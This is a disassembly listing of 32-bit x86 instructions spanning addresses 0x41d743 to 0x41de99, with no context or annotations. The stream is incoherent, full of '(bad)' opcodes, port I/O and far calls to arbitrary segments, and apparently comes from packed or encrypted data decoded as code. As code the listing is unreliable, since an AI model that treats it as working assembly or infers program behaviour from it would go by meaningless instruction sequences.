  41d743:	ins    DWORD PTR es:[edi],dx
  41d744:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d745:	mov    edi,0xc12e5ccf
  41d74a:	(bad)  
  41d74b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d74c:	test   esi,edi
  41d74e:	in     al,dx
  41d74f:	pop    ecx
  41d750:	push   0xffffffdf
  41d752:	mov    ebp,0xbf0c1036
  41d757:	adc    DWORD PTR [ebx+0x118cf562],ecx
  41d75d:	bound  edi,QWORD PTR [edi]
  41d75f:	add    edx,esi
  41d761:	inc    ebp
  41d762:	push   cs
  41d763:	inc    esi
  41d764:	dec    ebp
  41d765:	(bad)  
  41d767:	dec    esp
  41d768:	pop    eax
  41d769:	bound  esi,QWORD PTR [edx+0x60]
  41d76c:	sub    eax,0x1fcd049b
  41d771:	xor    al,0xc6
  41d773:	xor    eax,0xbe97b894
  41d778:	jmp    0x41d733
  41d77a:	aaa    
  41d77b:	or     eax,0x5509a795
  41d780:	xchg   ebx,eax
  41d781:	mov    es,WORD PTR [ecx-0x46]
  41d784:	mov    edi,0xda4928f3
  41d789:	lods   eax,DWORD PTR ds:[esi]
  41d78a:	fstp   DWORD PTR cs:[edi+0x5da355db]
  41d791:	mov    esp,0x140ca34d
  41d796:	and    al,ah
  41d798:	sbb    bh,bl
  41d79a:	mov    al,0x3b
  41d79c:	fsub   st(3),st
  41d79e:	fstp   DWORD PTR [edi]
  41d7a0:	sti    
  41d7a1:	sbb    esp,DWORD PTR [edx]
  41d7a3:	add    eax,0x714ae0a1
  41d7a8:	in     eax,dx
  41d7a9:	xchg   ebx,eax
  41d7aa:	test   al,0x15
  41d7ac:	jne    0x41d764
  41d7ae:	mov    edi,0x7a852e7c
  41d7b3:	jnp    0x41d741
  41d7b5:	out    0xa0,al
  41d7b7:	ins    BYTE PTR es:[edi],dx
  41d7b8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d7b9:	mov    dl,0x1d
  41d7bb:	mov    fs,WORD PTR [eax+edx*8]
  41d7be:	dec    eax
  41d7bf:	test   ch,dh
  41d7c1:	push   ebp
  41d7c2:	mov    cl,0xe1
  41d7c4:	mov    ecx,0x7fc64c24
  41d7c9:	aas    
  41d7ca:	out    0xd3,al
  41d7cc:	add    al,bl
  41d7ce:	int    0xdc
  41d7d0:	or     BYTE PTR [esi],cl
  41d7d2:	add    DWORD PTR [ebx+0x36595bcb],0x5d
  41d7d9:	sbb    dh,bh
  41d7db:	pusha  
  41d7dc:	cdq    
  41d7dd:	jno    0x41d7a7
  41d7df:	jo     0x41d779
  41d7e1:	nop
  41d7e2:	not    BYTE PTR [edi+ebx*8+0x5f]
  41d7e6:	adc    eax,0x3bf3b8f4
  41d7eb:	cli    
  41d7ec:	aas    
  41d7ed:	fist   DWORD PTR [edi]
  41d7ef:	retf   
  41d7f0:	dec    eax
  41d7f1:	sub    eax,0xb684ee50
  41d7f6:	inc    ecx
  41d7f7:	mov    ds:0x58a6a543,al
  41d7fc:	jnp    0x41d813
  41d7fe:	fld    DWORD PTR [esi+0x1f2eeaea]
  41d804:	daa    
  41d805:	xor    al,0x59
  41d807:	int3   
  41d808:	mov    esp,DWORD PTR [esi-0x72]
  41d80b:	repz mov ss,WORD PTR [esi+0x42]
  41d80f:	jl     0x41d7a9
  41d811:	adc    esi,DWORD PTR [edx]
  41d813:	mov    bl,0x52
  41d815:	ins    BYTE PTR es:[edi],dx
  41d816:	shr    DWORD PTR [edi+0x69e7cd69],0x61
  41d81d:	jnp    0x41d81c
  41d81f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d820:	push   es
  41d821:	cmp    BYTE PTR [edi],ah
  41d823:	shl    BYTE PTR [edx],0x10
  41d826:	pushf  
  41d827:	xor    BYTE PTR [ebp-0x388fdcc3],al
  41d82d:	adc    DWORD PTR [edx-0x322dd1ee],0x40ec9f9d
  41d837:	call   0xa115:0x2c8afc46
  41d83e:	sahf   
  41d83f:	mov    ?,WORD PTR [ebp+edi*2+0x31]
  41d843:	repnz cs test al,0x73
  41d847:	dec    esi
  41d848:	xor    eax,0xc27eabfa
  41d84d:	xchg   esi,eax
  41d84e:	xlat   BYTE PTR ds:[ebx]
  41d84f:	call   0x71c3:0xd068a636
  41d856:	inc    edi
  41d857:	retf   0x5ab4
  41d85a:	icebp  
  41d85b:	sbb    al,0x18
  41d85d:	cmp    esi,eax
  41d85f:	cmp    DWORD PTR [edi+ebp*2-0x3c242a2f],edx
  41d866:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d867:	push   cs
  41d868:	ss add bh,bh
  41d86b:	sbb    eax,0x3d25833
  41d870:	xchg   ebp,eax
  41d871:	sti    
  41d872:	in     eax,0x58
  41d874:	dec    esi
  41d875:	adc    al,0xbd
  41d877:	shl    BYTE PTR [ebp+0x30],0xb1
  41d87b:	pop    ebp
  41d87c:	loop   0x41d861
  41d87e:	retf   
  41d87f:	sub    eax,0x2955e776
  41d884:	mov    eax,DWORD PTR [ecx-0x6ed2c1f9]
  41d88a:	mov    ds,WORD PTR [eax]
  41d88c:	mov    eax,0xe77370f3
  41d891:	cdq    
  41d892:	loope  0x41d909
  41d894:	repnz and bh,BYTE PTR [esi]
  41d897:	test   eax,0xcbc45927
  41d89c:	jb     0x41d889
  41d89e:	fcom   DWORD PTR [eax]
  41d8a0:	jge    0x41d83d
  41d8a2:	retf   0xf265
  41d8a5:	fidiv  WORD PTR [esi+0x34]
  41d8a8:	mov    dh,0xea
  41d8aa:	add    BYTE PTR [edx+0x2087ba13],dl
  41d8b0:	rep movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d8b2:	(bad)  
  41d8b3:	(bad)  
  41d8b4:	xchg   esi,eax
  41d8b5:	fadd   DWORD PTR [ecx-0x34]
  41d8b8:	retf   
  41d8b9:	or     eax,0xbd1a34a4
  41d8be:	mov    dh,0x1f
  41d8c0:	and    cl,BYTE PTR [edi+0x78f6b36f]
  41d8c6:	pop    es
  41d8c7:	cmp    bh,bl
  41d8c9:	lahf   
  41d8ca:	push   0x5ab39859
  41d8cf:	mov    ch,0x4d
  41d8d1:	and    dl,ah
  41d8d3:	adc    al,0xbe
  41d8d5:	dec    edx
  41d8d6:	lods   eax,DWORD PTR ds:[esi]
  41d8d7:	sub    DWORD PTR [ecx],0xa5de2d79
  41d8dd:	loope  0x41d929
  41d8df:	jmp    0x41d95a
  41d8e1:	mov    ah,0x5c
  41d8e3:	jbe    0x41d8f4
  41d8e5:	stos   BYTE PTR es:[edi],al
  41d8e6:	xlat   BYTE PTR ds:[ebx]
  41d8e7:	adc    DWORD PTR [edi-0x1],ebp
  41d8ea:	pushf  
  41d8eb:	out    0x0,eax
  41d8ed:	enter  0x992c,0xd8
  41d8f1:	pushf  
  41d8f2:	xchg   esp,edi
  41d8f4:	ds nop
  41d8f6:	or     cl,ah
  41d8f8:	inc    esi
  41d8f9:	cld    
  41d8fa:	out    0x8,eax
  41d8fc:	cmp    al,0x30
  41d8fe:	mov    al,ds:0xfb4f01ca
  41d903:	add    edi,DWORD PTR ds:0x9450dd4b
  41d909:	fnstsw WORD PTR [ebx]
  41d90b:	cwde   
  41d90c:	adc    eax,0x72b953c1
  41d911:	arpl   WORD PTR [ebx],dx
  41d913:	sbb    esi,DWORD PTR [esi+0xf8d7df]
  41d919:	inc    eax
  41d91a:	and    bl,BYTE PTR [eax+0x32]
  41d91d:	push   cs
  41d91e:	fistp  WORD PTR [edx]
  41d920:	cli    
  41d921:	arpl   WORD PTR [edx-0x11],di
  41d924:	fdiv   st,st(6)
  41d926:	jne    0x41d9a0
  41d928:	fs pushf 
  41d92a:	or     BYTE PTR [edx+0x4cf9f670],dh
  41d930:	sbb    al,0xd1
  41d932:	mov    eax,ds:0x16c4d8e
  41d937:	out    0x52,eax
  41d939:	into   
  41d93a:	sub    cl,BYTE PTR [ebx+0x19]
  41d93d:	xchg   DWORD PTR [edx+0x35],edx
  41d940:	call   0x92acbebf
  41d945:	pop    edx
  41d946:	out    0x96,al
  41d948:	scas   al,BYTE PTR es:[edi]
  41d949:	cmp    al,0xa
  41d94b:	and    ebp,DWORD PTR [ecx+edi*4]
  41d94e:	and    BYTE PTR [edx],bh
  41d950:	add    al,0xd6
  41d952:	jl     0x41d99a
  41d954:	dec    edi
  41d955:	bound  ecx,QWORD PTR [esi-0x63]
  41d958:	push   ss
  41d959:	mov    dl,0xb6
  41d95b:	jmp    0xb6e2a03d
  41d960:	sbb    BYTE PTR [ebp+0x78],al
  41d963:	imul   eax,edi,0xffffffcd
  41d966:	out    0xee,al
  41d968:	mov    ebx,0x57bdc569
  41d96d:	push   0xffffffe2
  41d96f:	fsubr  QWORD PTR [ebx]
  41d971:	imul   esi,DWORD PTR [eax],0x95265560
  41d977:	adc    eax,0x899e7a90
  41d97c:	ja     0x41d97e
  41d97e:	xor    ecx,DWORD PTR [edx-0x61de32ef]
  41d984:	ins    BYTE PTR es:[edi],dx
  41d985:	or     BYTE PTR [ecx+0x35],cl
  41d988:	aas    
  41d989:	inc    eax
  41d98a:	out    dx,al
  41d98b:	ret    
  41d98c:	push   edi
  41d98d:	(bad)  
  41d98e:	mov    esi,0xb7357755
  41d993:	cmc    
  41d994:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d995:	(bad)
  41d998:	in     al,0xba
  41d99a:	mov    BYTE PTR [ebp+0x40],ah
  41d99d:	inc    ecx
  41d99e:	fwait
  41d99f:	imul   esp,DWORD PTR [edx-0x30],0x7068058d
  41d9a6:	inc    ebp
  41d9a7:	xchg   DWORD PTR [eax],ecx
  41d9a9:	mov    ebx,0x52833b4a
  41d9ae:	rcl    BYTE PTR [ecx],1
  41d9b0:	pop    edx
  41d9b1:	cmp    dl,ch
  41d9b3:	dec    esi
  41d9b4:	test   al,0x83
  41d9b6:	dec    ch
  41d9b8:	sbb    ebp,0x827e54be
  41d9be:	(bad)  
  41d9bf:	cmp    bl,ah
  41d9c1:	xor    esp,DWORD PTR [edx]
  41d9c3:	and    al,BYTE PTR [ecx+ecx*4-0x1f]
  41d9c7:	add    DWORD PTR [edx],esp
  41d9c9:	jno    0x41da31
  41d9cb:	test   DWORD PTR [ebp+eax*8-0x3b],esi
  41d9cf:	pop    edi
  41d9d0:	xlat   BYTE PTR ds:[ebx]
  41d9d1:	mov    ds:0x4219f040,eax
  41d9d6:	fisubr WORD PTR [ecx]
  41d9d8:	lea    edi,[esi+0x743205c3]
  41d9de:	push   0xe0e5ebd7
  41d9e3:	add    eax,0xb5198db
  41d9e8:	add    BYTE PTR ds:0xa8f7a58e,bh
  41d9ee:	jge    0x41d98b
  41d9f0:	mov    cs,WORD PTR [esi+0x4700f2f6]
  41d9f6:	mov    dh,0x1b
  41d9f8:	jbe    0x41da50
  41d9fa:	mov    WORD PTR [ebx+0x18],ds
  41d9fd:	inc    ecx
  41d9fe:	ja     0x41d9c8
  41da00:	mov    dh,0xb6
  41da02:	outs   dx,DWORD PTR ds:[esi]
  41da03:	push   eax
  41da04:	or     BYTE PTR [ebx+0x48],cl
  41da07:	lahf   
  41da08:	ins    DWORD PTR es:[edi],dx
  41da09:	call   0xe6e0:0xb3264883
  41da10:	adc    eax,0x8e5922be
  41da15:	or     DWORD PTR [edi-0x488214da],ecx
  41da1b:	out    0xc0,al
  41da1d:	aad    0xce
  41da1f:	pop    ebx
  41da20:	into   
  41da21:	mov    ah,0xf6
  41da23:	nop
  41da24:	iret   
  41da25:	xchg   esi,eax
  41da26:	pop    ebx
  41da27:	das    
  41da28:	fcom   QWORD PTR [esi+0x2d9ae170]
  41da2e:	fldcw  WORD PTR [ecx]
  41da30:	dec    esi
  41da31:	stos   BYTE PTR es:[edi],al
  41da32:	rcr    BYTE PTR [ecx+0x724ad269],cl
  41da38:	jl     0x41da85
  41da3a:	mov    ch,0x59
  41da3c:	fs mul ebx
  41da3f:	pusha  
  41da40:	mov    bh,0xdd
  41da42:	cdq    
  41da43:	lds    esi,FWORD PTR [edi]
  41da45:	arpl   WORD PTR [edi+0x4b],dx
  41da48:	push   ss
  41da49:	loopne 0x41dab3
  41da4b:	jg     0x41da6c
  41da4d:	outs   dx,BYTE PTR ds:[esi]
  41da4e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41da4f:	push   esp
  41da50:	jo     0x41da7d
  41da52:	out    dx,al
  41da53:	idiv   DWORD PTR [ecx+edx*2]
  41da56:	and    al,0x1
  41da58:	aas    
  41da59:	call   0xc15b:0x8110de01
  41da60:	ret    0x5b1e
  41da63:	scas   al,BYTE PTR es:[edi]
  41da64:	xchg   DWORD PTR ds:0x9e23c70,edx
  41da6a:	add    al,0xab
  41da6c:	shl    BYTE PTR [esi],1
  41da6e:	dec    ebp
  41da6f:	into   
  41da70:	test   al,0x84
  41da72:	sbb    bl,dh
  41da74:	loop   0x41da38
  41da76:	xor    DWORD PTR [esi+0x745d14e3],esi
  41da7c:	or     edx,DWORD PTR [ecx+0xb698e3e]
  41da82:	call   0x3a62:0x376129ff
  41da89:	dec    esi
  41da8a:	sub    BYTE PTR fs:[ebx+eiz*8+0x943d414],dh
  41da92:	sub    DWORD PTR [ebx+0x6d],edx
  41da95:	jp     0x41db0c
  41da97:	xchg   BYTE PTR [edx+ebp*4-0x7e],bl
  41da9b:	dec    edi
  41da9c:	ss mov bh,0x5a
  41da9f:	cmp    ebp,ecx
  41daa1:	aas    
  41daa2:	repnz dec esp
  41daa4:	push   esp
  41daa5:	xor    al,0xb8
  41daa7:	stos   BYTE PTR es:[edi],al
  41daa8:	nop
  41daa9:	mov    DWORD PTR [ecx+0x29c3db32],ebx
  41daaf:	add    bh,al
  41dab1:	dec    ebp
  41dab2:	mov    dh,bh
  41dab4:	add    eax,0xde3c6487
  41dab9:	push   eax
  41daba:	in     al,0xee
  41dabc:	mov    esi,0xb2cd427f
  41dac1:	sti    
  41dac2:	int3   
  41dac3:	stos   DWORD PTR es:[edi],eax
  41dac4:	adc    dh,BYTE PTR ss:[edi-0x7dfa71df]
  41dacb:	pop    ecx
  41dacc:	inc    ebp
  41dacd:	repnz push esi
  41dacf:	ss sbb eax,0x2d53bdb3
  41dad5:	push   cs
  41dad6:	xchg   edi,eax
  41dad7:	adc    esi,DWORD PTR [ebx]
  41dad9:	jo     0x41dab1
  41dadb:	jecxz  0x41dae2
  41dadd:	and    ebx,DWORD PTR [edx+ebx*2-0x222eb05]
  41dae4:	mov    ds:0x7ef92a27,al
  41dae9:	pop    esi
  41daea:	jo     0x41db25
  41daec:	jg     0x41da75
  41daee:	ffree  st(5)
  41daf0:	fcmovne st,st(6)
  41daf2:	popa   
  41daf3:	inc    ecx
  41daf4:	xchg   esi,eax
  41daf5:	adc    al,0x62
  41daf7:	push   ecx
  41daf8:	adc    al,0xd8
  41dafa:	mov    ds:0xbfdae165,eax
  41daff:	fs ja  0x41daa8
  41db02:	lahf   
  41db03:	clc    
  41db04:	std    
  41db05:	xchg   DWORD PTR [edx+0x795371d8],esi
  41db0b:	ins    BYTE PTR es:[edi],dx
  41db0c:	ins    BYTE PTR es:[edi],dx
  41db0d:	cmc    
  41db0e:	ret    
  41db0f:	pop    esi
  41db10:	cmc    
  41db11:	mov    esi,0x781eefe7
  41db16:	(bad)  
  41db17:	ds dec esp
  41db19:	loopne 0x41dadc
  41db1b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41db1c:	(bad)  
  41db1d:	push   esp
  41db1e:	lods   al,BYTE PTR ds:[esi]
  41db1f:	test   eax,0xc4544ae2
  41db24:	test   dh,cl
  41db26:	fs pop ecx
  41db28:	hlt    
  41db29:	mov    al,ds:0x6666a907
  41db2e:	icebp  
  41db2f:	hlt    
  41db30:	push   0x3c
  41db32:	mov    al,ds:0x16d69e3c
  41db37:	std    
  41db38:	(bad)  
  41db39:	out    dx,eax
  41db3a:	es stos DWORD PTR es:[edi],eax
  41db3c:	mov    cs,WORD PTR [ebx-0x6c]
  41db3f:	cmp    eax,0x24a97f82
  41db44:	mov    BYTE PTR [esi+0x748d5aad],0x74
  41db4b:	or     BYTE PTR [eax+0x25c72020],bh
  41db51:	cli    
  41db52:	xchg   DWORD PTR [eax],esp
  41db54:	xchg   ebp,eax
  41db55:	mov    DWORD PTR [edi+0x6862244e],eax
  41db5b:	sbb    dh,BYTE PTR [edi-0x46]
  41db5e:	data16 ds jecxz 0x41db00
  41db62:	push   ds
  41db63:	iret   
  41db64:	and    ebx,ecx
  41db66:	repz push es
  41db68:	add    eax,0xe70a2f1d
  41db6d:	aad    0x9e
  41db6f:	push   edx
  41db70:	ins    BYTE PTR es:[edi],dx
  41db71:	pop    ss
  41db72:	push   0xe11d62bc
  41db77:	cld    
  41db78:	in     al,dx
  41db79:	sbb    bl,bh
  41db7b:	call   0xfe3a:0x6b9d56db
  41db82:	jle    0x41db5d
  41db84:	jb     0x41dbf7
  41db86:	dec    ecx
  41db87:	and    al,0xbb
  41db89:	in     eax,dx
  41db8a:	imul   eax,edi,0xe3208651
  41db90:	or     DWORD PTR [ecx],esi
  41db92:	arpl   cx,cx
  41db94:	mov    WORD PTR [ecx-0x57],ds
  41db97:	or     eax,0x99415a24
  41db9c:	sub    al,0xcb
  41db9e:	rcl    DWORD PTR [ebx],cl
  41dba0:	xor    ecx,DWORD PTR [edi+eiz*1-0x2ace0971]
  41dba7:	xor    al,bl
  41dba9:	inc    esi
  41dbaa:	addr16 je 0x41db45
  41dbad:	into   
  41dbae:	ss out dx,eax
  41dbb0:	int3   
  41dbb1:	les    ecx,FWORD PTR [esi]
  41dbb3:	xor    DWORD PTR [esi+0x1e],eax
  41dbb6:	push   eax
  41dbb7:	imul   esi,edi,0x317f7e93
  41dbbd:	lods   eax,DWORD PTR ds:[esi]
  41dbbe:	in     al,0x25
  41dbc0:	test   eax,0xd1b3516b
  41dbc5:	cmp    BYTE PTR [edx+edx*8+0x4c],ah
  41dbc9:	popf   
  41dbca:	inc    eax
  41dbcb:	(bad)  
  41dbcc:	push   esp
  41dbcd:	ret    
  41dbce:	pop    esi
  41dbcf:	outs   dx,BYTE PTR ds:[esi]
  41dbd0:	jns    0x41db57
  41dbd2:	out    dx,eax
  41dbd3:	adc    al,BYTE PTR [esi]
  41dbd5:	lahf   
  41dbd6:	in     eax,0x79
  41dbd8:	test   ah,0x89
  41dbdb:	int    0x3b
  41dbdd:	pushf  
  41dbde:	mov    ebx,0x69752946
  41dbe3:	add    al,0xf2
  41dbe5:	scas   al,BYTE PTR es:[edi]
  41dbe6:	cli    
  41dbe7:	mov    BYTE PTR [eax+0x5f],0xff
  41dbeb:	ret    
  41dbec:	jmp    0x41dc65
  41dbee:	ror    DWORD PTR [ecx*8+0x47604c06],1
  41dbf5:	cmp    eax,0xf43722fe
  41dbfa:	sbb    al,0x3b
  41dbfc:	xchg   eax,esp
  41dbfe:	xchg   esi,eax
  41dbff:	adc    ecx,DWORD PTR [ebx-0x3d8fe075]
  41dc05:	ss push esp
  41dc07:	push   0xffffffdf
  41dc09:	(bad)  
  41dc0a:	icebp  
  41dc0b:	ins    DWORD PTR es:[edi],dx
  41dc0c:	mov    edi,0xd8096a0d
  41dc11:	add    dh,ah
  41dc13:	in     al,0x64
  41dc15:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41dc16:	push   ecx
  41dc17:	inc    esi
  41dc18:	xor    al,0x74
  41dc1a:	push   esi
  41dc1b:	jae    0x41dc92
  41dc1d:	cmp    DWORD PTR [edi],eax
  41dc1f:	dec    edx
  41dc20:	push   esi
  41dc21:	add    BYTE PTR [edi-0x4c],al
  41dc24:	pop    ebp
  41dc25:	ret    0x5b1a
  41dc28:	xlat   BYTE PTR ds:[ebx]
  41dc29:	mov    bh,0x9f
  41dc2b:	and    DWORD PTR [ecx-0x3dcfa0f3],esi
  41dc31:	fistp  DWORD PTR [esi]
  41dc33:	das    
  41dc34:	inc    edx
  41dc35:	ret    
  41dc36:	imul   esp,DWORD PTR [edi],0x61
  41dc39:	sub    edx,DWORD PTR [ebx+0x11]
  41dc3c:	icebp  
  41dc3d:	mov    esp,0x82e97457
  41dc42:	sub    eax,edi
  41dc44:	mov    al,0x8a
  41dc46:	retf   0x17d0
  41dc49:	loope  0x41dc7c
  41dc4b:	ror    DWORD PTR [edx+0x3f],cl
  41dc4e:	out    dx,eax
  41dc4f:	pop    ss
  41dc50:	xlat   BYTE PTR ds:[ebx]
  41dc51:	imul   eax,DWORD PTR [eax],0x1f
  41dc54:	xchg   al,ah
  41dc56:	out    dx,eax
  41dc57:	out    dx,al
  41dc58:	inc    ecx
  41dc59:	jp     0x41dc37
  41dc5b:	inc    edx
  41dc5c:	cld    
  41dc5d:	pushf  
  41dc5e:	and    esp,DWORD PTR [ebp+0x257d8b4b]
  41dc64:	and    BYTE PTR [edx],dl
  41dc66:	xchg   ebx,eax
  41dc67:	mov    esi,esp
  41dc69:	(bad)  
  41dc6a:	(bad)  
  41dc6b:	sbb    al,0x9c
  41dc6d:	mov    al,ds:0xd6f4e1a8
  41dc72:	in     al,dx
  41dc73:	jl     0x41dc78
  41dc75:	cmp    BYTE PTR [edi-0xdd908c],ch
  41dc7b:	xor    eax,0xc354c7ff
  41dc80:	sub    al,0x88
  41dc82:	(bad)  
  41dc84:	push   esi
  41dc85:	pop    ebp
  41dc86:	jnp    0x41dc57
  41dc88:	and    al,0x8a
  41dc8a:	xchg   edi,eax
  41dc8b:	pop    ds
  41dc8c:	pop    eax
  41dc8d:	add    cl,BYTE PTR [edi]
  41dc8f:	xchg   esi,eax
  41dc90:	inc    ebp
  41dc91:	jmp    0xc43d:0x9fbe2b2e
  41dc98:	push   cs
  41dc99:	jns    0x41dcbe
  41dc9b:	push   es
  41dc9c:	fadd   DWORD PTR [ebp+0x40acf401]
  41dca2:	fdivr  DWORD PTR [eax+0x23af9a3b]
  41dca8:	mov    bl,0xf1
  41dcaa:	add    BYTE PTR [edi-0x64],0x6d
  41dcae:	inc    ebp
  41dcaf:	sti    
  41dcb0:	jno    0x41dcd9
  41dcb2:	out    0xcb,eax
  41dcb4:	xchg   ecx,eax
  41dcb5:	sbb    edx,eax
  41dcb7:	loope  0x41dd14
  41dcb9:	mov    ecx,0x867af9d1
  41dcbe:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41dcbf:	inc    ecx
  41dcc0:	popa   
  41dcc1:	shl    DWORD PTR [edi*8-0x24379b01],0x82
  41dcc9:	xor    eax,0x3c0dd28c
  41dcce:	and    eax,0x6289376
  41dcd3:	inc    esp
  41dcd4:	pop    ecx
  41dcd5:	inc    ebp
  41dcd6:	sbb    eax,0xee6c1265
  41dcdb:	mov    dl,0x44
  41dcdd:	cwde   
  41dcde:	xchg   edx,eax
  41dcdf:	cmc    
  41dce0:	nop
  41dce1:	fld    QWORD PTR [ebp+0x76]
  41dce4:	add    eax,0xf7f7616c
  41dce9:	enter  0x9136,0x2a
  41dced:	push   esp
  41dcee:	push   esp
  41dcef:	cmp    al,0x7c
  41dcf1:	sahf   
  41dcf2:	add    eax,0xf00f9822
  41dcf7:	arpl   WORD PTR [eax+0x19],si
  41dcfa:	push   ecx
  41dcfb:	jg     0x41dd1c
  41dcfd:	(bad)  
  41dcfe:	imul   ebx,DWORD PTR [ebx-0x3],0xffffffab
  41dd02:	ja     0x41dd0c
  41dd04:	sbb    eax,0xa5698b20
  41dd09:	xchg   esi,eax
  41dd0a:	pusha  
  41dd0b:	xor    esp,DWORD PTR [ecx+edi*2-0x29]
  41dd0f:	daa    
  41dd10:	jo     0x41dd2c
  41dd12:	rcl    BYTE PTR [esi+0x71],cl
  41dd15:	or     eax,0x7f8010c1
  41dd1a:	cmp    esi,edx
  41dd1c:	fmul   QWORD PTR [edi]
  41dd1e:	std    
  41dd1f:	scas   eax,DWORD PTR es:[edi]
  41dd20:	sbb    dh,ch
  41dd22:	fnstsw WORD PTR [edx-0x4049ea32]
  41dd28:	mov    bh,0x48
  41dd2a:	dec    esp
  41dd2b:	sbb    eax,0x525f7558
  41dd30:	(bad)  
  41dd32:	mov    DWORD PTR [ebp-0x5f16e569],ecx
  41dd38:	push   ss
  41dd39:	ins    DWORD PTR es:[edi],dx
  41dd3a:	mov    esi,0x27b01d0
  41dd3f:	jne    0x41dd50
  41dd41:	cdq    
  41dd42:	dec    eax
  41dd43:	sub    al,0x8a
  41dd45:	push   ebp
  41dd46:	repz test DWORD PTR [eax],ecx
  41dd49:	gs jae 0x41dd6a
  41dd4c:	fdiv   DWORD PTR [ebp+0x44]
  41dd4f:	jo     0x41dd7a
  41dd51:	and    al,0x67
  41dd53:	(bad)  
  41dd54:	sub    DWORD PTR [edx+edi*1],ebx
  41dd57:	xlat   BYTE PTR ds:[ebx]
  41dd58:	mov    ecx,0x755a104d
  41dd5d:	lea    ebx,[ebp-0x16]
  41dd60:	or     edi,DWORD PTR [edi+edi*4+0x7ebcdfd4]
  41dd67:	or     ebx,edi
  41dd69:	idiv   esp
  41dd6b:	xchg   edi,eax
  41dd6c:	test   al,0xfd
  41dd6e:	aad    0x76
  41dd70:	and    al,BYTE PTR [eax-0x1dc4dadc]
  41dd76:	push   cs
  41dd77:	and    al,0xcc
  41dd79:	mov    bh,ch
  41dd7b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41dd7c:	ret    0x15ec
  41dd7f:	ja     0x41dd26
  41dd81:	dec    ebp
  41dd82:	sub    esp,DWORD PTR [ebx+0x27029735]
  41dd88:	jle    0x41ddfc
  41dd8a:	retf   0x87ed
  41dd8d:	test   al,0x6a
  41dd8f:	mov    dl,0x83
  41dd91:	push   ds
  41dd92:	jne    0x41dd8f
  41dd94:	imul   BYTE PTR [esi-0x2f]
  41dd97:	jle    0x41dd69
  41dd99:	xor    DWORD PTR [ebx-0x4984b04],edi
  41dd9f:	sbb    dl,0x81
  41dda2:	inc    ebx
  41dda3:	push   cs
  41dda4:	stos   BYTE PTR es:[edi],al
  41dda5:	shr    BYTE PTR [ebx+0x4e23c8f0],0x76
  41ddac:	enter  0x6d0c,0xfe
  41ddb0:	inc    esi
  41ddb1:	xchg   ebx,eax
  41ddb2:	jnp    0x41de24
  41ddb4:	call   0x6703:0x7f19b171
  41ddbb:	aam    0x4e
  41ddbd:	(bad)  
  41ddbe:	(bad)  
  41ddc0:	pop    eax
  41ddc1:	mov    ch,0xe
  41ddc3:	pop    edi
  41ddc4:	mov    dh,0xb7
  41ddc6:	pushf  
  41ddc7:	fild   DWORD PTR [eax+0x31]
  41ddca:	push   ebx
  41ddcb:	mov    ecx,0x68aad03c
  41ddd0:	inc    ecx
  41ddd1:	adc    al,0x19
  41ddd3:	add    eax,0xb1c5d18a
  41ddd8:	inc    ebp
  41ddd9:	stc    
  41ddda:	cwde   
  41dddb:	and    eax,ebp
  41dddd:	xlat   BYTE PTR ds:[ebx]
  41ddde:	cmp    ch,BYTE PTR [edx+eiz*4-0x18205e56]
  41dde5:	in     eax,0xfe
  41dde7:	jmp    0x41dde1
  41dde9:	jne    0x41ddc3
  41ddeb:	pop    ebx
  41ddec:	ja     0x41dde1
  41ddee:	push   ss
  41ddef:	pushf  
  41ddf0:	loop   0x41ddad
  41ddf2:	adc    ah,dh
  41ddf4:	and    DWORD PTR [eax],edi
  41ddf6:	dec    esp
  41ddf7:	mov    DWORD PTR [edx+0x0],edi
  41ddfa:	popa   
  41ddfb:	sbb    BYTE PTR [ebx-0x62060685],dh
  41de01:	lods   al,BYTE PTR ds:[esi]
  41de02:	push   es
  41de03:	adc    BYTE PTR [edi+0x27567b64],bh
  41de09:	jb     0x41dddb
  41de0b:	cmp    BYTE PTR [ecx+0xa9ba557],0x35
  41de12:	bound  esp,QWORD PTR [ebx-0x57]
  41de15:	aas    
  41de16:	add    al,0x8
  41de18:	mov    esp,0x1fb3b210
  41de1d:	icebp  
  41de1e:	push   ebp
  41de1f:	push   eax
  41de20:	shl    BYTE PTR [ebp+0x34dbfe88],1
  41de26:	jecxz  0x41ddfe
  41de28:	push   ds
  41de29:	or     al,BYTE PTR [esi+0x4e]
  41de2c:	mov    bl,0x7a
  41de2e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41de2f:	rol    BYTE PTR [edx],0xc9
  41de32:	adc    eax,0xcacd40a3
  41de37:	xor    bl,BYTE PTR [edx+0x7510acd5]
  41de3d:	stc    
  41de3e:	ds cmp eax,0xd47e56f2
  41de44:	add    BYTE PTR [ecx-0x75],al
  41de47:	rol    DWORD PTR [esp+esi*1-0x4b],cl
  41de4b:	inc    edi
  41de4c:	stos   DWORD PTR es:[edi],eax
  41de4d:	mov    al,ch
  41de4f:	jb     0x41de8d
  41de51:	mov    edi,0x65523107
  41de56:	mov    ds:0x4812d0f1,eax
  41de5b:	clc    
  41de5c:	ja     0x41de84
  41de5e:	sbb    bh,BYTE PTR [ebx]
  41de60:	ret    
  41de61:	retf   
  41de62:	mul    DWORD PTR [edi]
  41de64:	adc    eax,0x5b8daf97
  41de69:	sbb    DWORD PTR [ebp+0x2c],eax
  41de6c:	push   edi
  41de6d:	mov    ebp,0xa4fb7e06
  41de72:	addr16 jge 0x41de6a
  41de75:	jl     0x41de7e
  41de77:	push   eax
  41de78:	sbb    eax,0xc327974a
  41de7d:	push   ss
  41de7e:	cwde   
  41de7f:	or     al,BYTE PTR [edi+0x6b9f73df]
  41de85:	stc    
  41de86:	inc    ebx
  41de87:	ss push ebp
  41de89:	adc    bl,bh
  41de8b:	mov    ah,0xb8
  41de8d:	jae    0x41def9
  41de8f:	fstp   QWORD PTR [ebp-0x2a55d2e5]
  41de95:	add    eax,edx
  41de97:	dec    ecx
  41de98:	lods   eax,DWORD PTR ds:[esi]
  41de99:	mov    cl,0x6e
